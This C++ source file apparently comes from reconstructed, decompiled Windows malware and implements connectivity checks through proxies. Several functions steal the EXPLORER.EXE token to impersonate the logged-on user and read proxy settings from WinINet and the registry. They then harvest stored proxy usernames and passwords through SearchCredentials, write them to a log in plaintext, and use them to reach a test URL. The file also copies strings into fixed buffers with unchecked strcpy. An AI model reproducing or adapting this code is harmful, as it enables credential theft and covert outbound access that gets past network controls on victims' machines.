// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include "connection.hpp"

#include <iostream>
#include "StdAfx.hpp"
#include "proxy.hpp"
#include "setup.hpp"

BOOL TestConnection_NoProxy()
{
	DWORD dwBytes = 0;
	DWORD dwMaxSize = 260;

	CHAR szUserName[260];
	GetUserName(szUserName, &dwMaxSize);

	LPVOID lpMem = GetURL_NoProxy(g_szTestURL, &dwBytes);

	LOG("\r\nmethod 1:\r\n\r\n");
	LOG("User:");
	LOG(szUserName);
	LOG("\r\n\r\n");

	BOOL bSucces;
	if (lpMem)
	{
#ifdef TEST_CONNECTION_VERBOSE
		std::cout << (char*)lpMem << std::endl;
#endif // TEST_CONNECTION_VERBOSE

		WriteLog(lpMem, dwBytes);
		HeapFree(GetProcessHeap(), 0, lpMem);

		bSucces = TRUE;
	}
	else
	{
		bSucces = FALSE;

		std::cout << "Method1 Fail!!!!!" << std::endl;
	}

	LOG("\r\n\r\n///////////////////////////////////////////////\r\n\r\n");

	return bSucces;
}

BOOL sub_1000605B()
{
	BOOL bImpersonated = FALSE;
	HANDLE TokenHandle;

	if (GetProcessHandle(&TokenHandle, "EXPLORER.EXE"))
		bImpersonated = ImpersonateLoggedOnUser(TokenHandle);

	RegDisablePredefinedCache();

	CHAR szUserName[260];
	DWORD dwSize = 260;

	GetUserName(szUserName, &dwSize);

	sprintf(g_nProxy_IP__TEST, g_szBlank);
	sprintf(g_nProxy_PORT__TEST, g_szBlank);
	sprintf(g_nProxy_USER__TEST, g_szBlank);
	sprintf(g_nProxy_PSW__TEST, g_szBlank);

	CHAR szUser[1024] = {};
	CHAR szPsw[1024] = {};

	char *lpszPattern;
	char *lpszProxyPort;
	char *lpszBuf1;
	char *lpszBuf2;

	INTERNET_PROXY_INFO lpProxyInfo = {};
	LPINTERNET_PROXY_INFO lppProxyInfo = &lpProxyInfo;
	DWORD dwBufferLength = 4096;

	InternetQueryOption(NULL, INTERNET_OPTION_PROXY, &lpProxyInfo, &dwBufferLength);
	if (lpProxyInfo.dwAccessType == INTERNET_OPEN_TYPE_PROXY)
	{
		char lpszProxyIP[1024];
		strcpy(lpszProxyIP, lpProxyInfo.lpszProxy);

		lpszPattern = "http=http://";
		lpszProxyPort = strstr(lpszProxyIP, "http=http://");
		if (NULL == lpszProxyPort)
			lpszProxyPort = lpszProxyIP;

		lpszPattern = "http=";
		lpszProxyPort = strstr(lpszProxyIP, "http=");
		if (NULL == lpszProxyPort)
			lpszProxyPort = lpszProxyIP;

		lpszProxyPort += strlen(lpszPattern);
		if (NULL == lpszProxyPort)
			lpszProxyPort = lpszProxyIP;

		lpszBuf1 = strchr(lpszProxyPort, ';');
		if (NULL != lpszBuf1)
			*lpszBuf1 = 0;

		lpszBuf2 = strchr(lpszProxyPort, ' ');
		if (NULL != lpszBuf2)
			*lpszBuf2 = 0;

		SearchCredentials(lpszProxyPort, szUser, szPsw);

		if (TRUE == bImpersonated)
		{
			Sleep(10);
			RevertToSelf();
		}

		lpszProxyPort = strrchr(lpszProxyIP, ':');
		if (lpszProxyPort)
		{
			strcpy(g_nProxy_PORT__TEST, lpszProxyPort + 1);
			strncpy(g_nProxy_IP__TEST, lpszProxyIP, strlen(lpszProxyIP) - strlen(lpszProxyPort));
		}
		else
		{
			strcpy(g_nProxy_PORT__TEST, g_szBlank);
			strncpy(g_nProxy_IP__TEST, lpszProxyIP, strlen(lpszProxyIP));
		}

		sprintf(g_nProxy_USER__TEST, "%s", szUser);
		sprintf(g_nProxy_PSW__TEST, "%s", szPsw);
	}
	else
	{
		HKEY hKey = NULL;
		RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, KEY_EXECUTE, &hKey);

		BOOL bProxyEnabled;
		dwSize = 4;
		RegQueryValueEx(hKey, "ProxyEnable", 0, 0, (LPBYTE)&bProxyEnabled, &dwSize);

		CHAR szProxyServer[1024] = {};
		dwSize = 1024;
		RegQueryValueEx(hKey, "ProxyServer", 0, 0, (LPBYTE)szProxyServer, &dwSize);

		CHAR szProxyOverride[1024] = {};
		dwSize = 1024;
		RegQueryValueEx(hKey, "ProxyOverride", 0, 0, (LPBYTE)szProxyOverride, &dwSize);

		RegCloseKey(hKey);

		if (FALSE != bProxyEnabled)
		{
			char lpszProxyIP[1024];

			lpProxyInfo.dwAccessType	= INTERNET_OPEN_TYPE_PROXY;
			lpProxyInfo.lpszProxy		= szProxyServer;
			lpProxyInfo.lpszProxyBypass	= szProxyServer;

			strcpy(lpszProxyIP, szProxyServer);

			lpszPattern = "http=http://";
			lpszProxyPort = strstr(lpszProxyIP, "http=http://");
			if (NULL == lpszProxyPort)
				lpszProxyPort = lpszProxyIP;

			lpszPattern = "http=";
			lpszProxyPort = strstr(lpszProxyIP, "http=");
			if (NULL == lpszProxyPort)
				lpszProxyPort = lpszProxyIP;

			lpszProxyPort += strlen(lpszPattern);
			if (NULL == lpszProxyPort)
				lpszProxyPort = lpszProxyIP;

			lpszBuf1 = strchr(lpszProxyPort, ';');
			if (NULL != lpszBuf1)
				*lpszBuf1 = 0;

			lpszBuf2 = strchr(lpszProxyPort, ' ');
			if (NULL != lpszBuf2)
				*lpszBuf2 = 0;

			SearchCredentials(lpszProxyPort, szUser, szPsw);

			if (TRUE == bImpersonated)
				RevertToSelf();

			lpszProxyPort = strrchr(lpszProxyIP, ':');
			if (lpszProxyPort)
			{
				strcpy(g_nProxy_PORT__TEST, lpszProxyPort + 1);
				strncpy(g_nProxy_IP__TEST, lpszProxyIP, strlen(lpszProxyIP) - strlen(lpszProxyPort));
			}
			else
			{
				strcpy(g_nProxy_PORT__TEST, g_szBlank);
				strncpy(g_nProxy_IP__TEST, lpszProxyIP, strlen(lpszProxyIP));
			}

			sprintf(g_nProxy_USER__TEST, "%s", szUser);
			sprintf(g_nProxy_PSW__TEST, "%s", szPsw);
		}
		else
		{
			lppProxyInfo = NULL;

			if (TRUE == bImpersonated)
				RevertToSelf();
		}
	}

	DWORD dwGetSize = 0;
	LPVOID lpMem = GetURL_CustomProxy(g_szTestURL,
		&dwGetSize,
		lppProxyInfo,
		12,
		g_szBlank,
		g_szBlank
	);

	LOG("\r\nmethod 3:\r\n\r\n");
	LOG("User:");
	LOG(szUserName);
	LOG("\r\n\r\n");
	LOG("\r\nProxyIP:");
	LOG(g_nProxy_IP__TEST);
	LOG("\r\nProxyBypass:");
	LOG(g_nProxy_PORT__TEST);
	LOG("\r\nUser:");
	LOG(g_nProxy_USER__TEST);
	LOG("\r\nPass:");
	LOG(g_nProxy_PSW__TEST);
	LOG("\r\n\r\n");

	BOOL bSuccess = FALSE;
	if (NULL != lpMem)
	{
#ifdef TEST_CONNECTION_VERBOSE
		std::cout << (char*)lpMem << std::endl;
#endif // TEST_CONNECTION_VERBOSE

		WriteLog(lpMem, dwGetSize);
		HeapFree(GetProcessHeap(), 0, lpMem);

		bSuccess = TRUE;
	}
	else
	{
		std::cout << "Method3 Fail!!!!!" << std::endl;
	}

	LOG("\r\n\r\n///////////////////////////////////////////////\r\n\r\n");

	return bSuccess;
}

BOOL sub_10006637()
{
	BOOL bImpersonated = FALSE;
	HANDLE TokenHandle;

	if (GetProcessHandle(&TokenHandle, "EXPLORER.EXE"))
		bImpersonated = ImpersonateLoggedOnUser(TokenHandle);

	RegDisablePredefinedCache();

	CHAR szUserName[260];
	DWORD dwSize = 260;

	GetUserName(szUserName, &dwSize);

	sprintf(g_nProxy_IP__TEST, g_szBlank);
	sprintf(g_nProxy_PORT__TEST, g_szBlank);
	sprintf(g_nProxy_USER__TEST, g_szBlank);
	sprintf(g_nProxy_PSW__TEST, g_szBlank);

	CHAR szUser[1024] = {};
	CHAR szPsw[1024] = {};

	char *lpszPattern;
	char *lpszProxyPort;
	char *lpszBuf1;
	char *lpszBuf2;

	INTERNET_PROXY_INFO lpProxyInfo = {};
	LPINTERNET_PROXY_INFO lppProxyInfo = &lpProxyInfo;
	DWORD dwBufferLength = 4096;

	InternetQueryOption(NULL, INTERNET_OPTION_PROXY, &lpProxyInfo, &dwBufferLength);
	if (lpProxyInfo.dwAccessType == INTERNET_OPEN_TYPE_PROXY)
	{
		char lpszProxyIP[1024];
		strcpy(lpszProxyIP, lpProxyInfo.lpszProxy);

		lpszPattern = "http=http://";
		lpszProxyPort = strstr(lpszProxyIP, "http=http://");
		if (NULL == lpszProxyPort)
			lpszProxyPort = lpszProxyIP;

		lpszPattern = "http=";
		lpszProxyPort = strstr(lpszProxyIP, "http=");
		if (NULL == lpszProxyPort)
			lpszProxyPort = lpszProxyIP;

		lpszProxyPort += strlen(lpszPattern);
		if (NULL == lpszProxyPort)
			lpszProxyPort = lpszProxyIP;

		lpszBuf1 = strchr(lpszProxyPort, ';');
		if (NULL != lpszBuf1)
			*lpszBuf1 = 0;

		lpszBuf2 = strchr(lpszProxyPort, ' ');
		if (NULL != lpszBuf2)
			*lpszBuf2 = 0;

		SearchCredentials(lpszProxyPort, szUser, szPsw);

		if (TRUE == bImpersonated)
		{
			Sleep(10);
			RevertToSelf();
		}

		lpszProxyPort = strrchr(lpszProxyIP, ':');
		if (lpszProxyPort)
		{
			strcpy(g_nProxy_PORT__TEST, lpszProxyPort + 1);
			strncpy(g_nProxy_IP__TEST, lpszProxyIP, strlen(lpszProxyIP) - strlen(lpszProxyPort));
		}
		else
		{
			strcpy(g_nProxy_PORT__TEST, g_szBlank);
			strncpy(g_nProxy_IP__TEST, lpszProxyIP, strlen(lpszProxyIP));
		}

		sprintf(g_nProxy_USER__TEST, "%s", szUser);
		sprintf(g_nProxy_PSW__TEST, "%s", szPsw);
	}
	else
	{
		HKEY hKey = NULL;
		RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, KEY_EXECUTE, &hKey);

		BOOL bProxyEnabled;
		dwSize = 4;
		RegQueryValueEx(hKey, "ProxyEnable", 0, 0, (LPBYTE)&bProxyEnabled, &dwSize);

		CHAR szProxyServer[1024] = {};
		dwSize = 1024;
		RegQueryValueEx(hKey, "ProxyServer", 0, 0, (LPBYTE)szProxyServer, &dwSize);

		CHAR szProxyOverride[1024] = {};
		dwSize = 1024;
		RegQueryValueEx(hKey, "ProxyOverride", 0, 0, (LPBYTE)szProxyOverride, &dwSize);

		RegCloseKey(hKey);

		if (FALSE != bProxyEnabled)
		{
			char lpszProxyIP[1024];

			lpProxyInfo.dwAccessType	= INTERNET_OPEN_TYPE_PROXY;
			lpProxyInfo.lpszProxy		= szProxyServer;
			lpProxyInfo.lpszProxyBypass	= szProxyServer;

			strcpy(lpszProxyIP, szProxyServer);

			lpszPattern = "http=http://";
			lpszProxyPort = strstr(lpszProxyIP, "http=http://");
			if (NULL == lpszProxyPort)
				lpszProxyPort = lpszProxyIP;

			lpszPattern = "http=";
			lpszProxyPort = strstr(lpszProxyIP, "http=");
			if (NULL == lpszProxyPort)
				lpszProxyPort = lpszProxyIP;

			lpszProxyPort += strlen(lpszPattern);
			if (NULL == lpszProxyPort)
				lpszProxyPort = lpszProxyIP;

			lpszBuf1 = strchr(lpszProxyPort, ';');
			if (NULL != lpszBuf1)
				*lpszBuf1 = 0;

			lpszBuf2 = strchr(lpszProxyPort, ' ');
			if (NULL != lpszBuf2)
				*lpszBuf2 = 0;

			SearchCredentials(lpszProxyPort, szUser, szPsw);

			if (TRUE == bImpersonated)
				RevertToSelf();

			lpszProxyPort = strrchr(lpszProxyIP, ':');
			if (lpszProxyPort)
			{
				strcpy(g_nProxy_PORT__TEST, lpszProxyPort + 1);
				strncpy(g_nProxy_IP__TEST, lpszProxyIP, strlen(lpszProxyIP) - strlen(lpszProxyPort));
			}
			else
			{
				strcpy(g_nProxy_PORT__TEST, g_szBlank);
				strncpy(g_nProxy_IP__TEST, lpszProxyIP, strlen(lpszProxyIP));
			}

			sprintf(g_nProxy_USER__TEST, "%s", szUser);
			sprintf(g_nProxy_PSW__TEST, "%s", szPsw);
		}
		else
		{
			lppProxyInfo = NULL;

			if (TRUE == bImpersonated)
				RevertToSelf();
		}
	}

	DWORD dwGetSize = 0;
	LPVOID lpMem = GetURL_CustomProxy(g_szTestURL,
		&dwGetSize,
		lppProxyInfo,
		12,
		g_nProxy_USER__TEST,
		g_nProxy_PSW__TEST
	);

	LOG("\r\nmethod 4:\r\n\r\n");
	LOG("User:");
	LOG(szUserName);
	LOG("\r\n\r\n");
	LOG("\r\nProxyIP:");
	LOG(g_nProxy_IP__TEST);
	LOG("\r\nProxyBypass:");
	LOG(g_nProxy_PORT__TEST);
	LOG("\r\nUser:");
	LOG(g_nProxy_USER__TEST);
	LOG("\r\nPass:");
	LOG(g_nProxy_PSW__TEST);
	LOG("\r\n\r\n");

	BOOL bSuccess = FALSE;
	if (NULL != lpMem)
	{
#ifdef TEST_CONNECTION_VERBOSE
		std::cout << (char*)lpMem << std::endl;
#endif // TEST_CONNECTION_VERBOSE

		WriteLog(lpMem, dwGetSize);
		HeapFree(GetProcessHeap(), 0, lpMem);

		bSuccess = TRUE;
	}
	else
	{
		std::cout << "Method4 Fail!!!!!" << std::endl;
	}

	LOG("\r\n\r\n///////////////////////////////////////////////\r\n\r\n");

	return bSuccess;
}

BOOL TestProxyConnection()
{
	CHAR szUserName[260];
	DWORD dwSize = 260;

	GetUserName(szUserName, &dwSize);

	Setup_();

	CHAR szProxy[260];
	CHAR szBypass[260];

	sprintf(szProxy, "%s:%s", g_nProxy_IP__TEST, g_nProxy_PORT__TEST);
	sprintf(szBypass, "%s:%s", g_nProxy_IP__TEST, g_nProxy_PORT__TEST);

	INTERNET_PROXY_INFO lpProxy;

	lpProxy.lpszProxy		= szProxy;
	lpProxy.lpszProxyBypass	= szBypass;
	lpProxy.dwAccessType	= INTERNET_OPEN_TYPE_PROXY;

	DWORD dwGetSize = 0;
	LPVOID lpMem = GetURL_CustomProxy(g_szTestURL,
		&dwGetSize,
		&lpProxy,
		12,
		g_nProxy_USER__TEST,
		g_nProxy_PSW__TEST
	);

	LOG("\r\nmethod currect:\r\n\r\n");
	LOG("User:");
	LOG(szUserName);
	LOG("\r\n\r\n");
	LOG("\r\nProxyIP:");
	LOG(lpProxy.lpszProxy);
	LOG("\r\nProxyBypass:");
	LOG(lpProxy.lpszProxyBypass);
	LOG("\r\nUser:");
	LOG(g_nProxy_USER__TEST);
	LOG("\r\nPass:");
	LOG(g_nProxy_PSW__TEST);
	LOG("\r\n\r\n");

	BOOL bSuccess = FALSE;
	if (NULL != lpMem)
	{
#ifdef TEST_CONNECTION_VERBOSE
		std::cout << (char*)lpMem << std::endl;
#endif // TEST_CONNECTION_VERBOSE

		WriteLog(lpMem, dwGetSize);
		HeapFree(GetProcessHeap(), 0, lpMem);

		bSuccess = TRUE;
	}

	LOG("\r\n\r\n///////////////////////////////////////////////\r\n\r\n");

	return bSuccess;
}
